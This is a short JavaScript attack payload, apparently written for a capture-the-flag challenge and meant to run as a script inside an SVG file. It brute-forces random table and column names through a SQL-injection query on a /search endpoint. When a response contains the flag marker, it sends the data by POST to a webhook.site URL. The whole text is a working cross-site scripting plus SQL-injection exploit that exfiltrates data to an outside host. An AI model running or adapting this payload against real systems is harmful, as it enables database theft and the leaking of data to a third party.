svg.script:
 alert('Script started');
  (async () => {
  // Try all possible table/column name patterns
  // For demo, try a few hardcoded guesses (replace with real brute-force if needed)
  const hex = '0123456789abcdef';
  for (let i = 0; i < 1000; i++) { // Try 1000 random guesses
    let suffix = '';
    for (let j = 0; j < 16; j++) suffix += hex[Math.floor(Math.random() * 16)];
    let table = `_${suffix}`;
    let column = `flag_${suffix}`;
    try {
      let resp = await fetch(`/search?q=' UNION SELECT id, ${column} FROM ${table} --`);
      if (resp.ok) {
        let data = await resp.text();
        if (data.includes('nexus{')) {
          await fetch('https://webhook.site/582e502c-88ba-4c5a-9eda-2c2e1a3b289b', {
            method: 'POST',
            body: data
          });
          break;
        }
      }
    } catch (e) {}
  }
})();
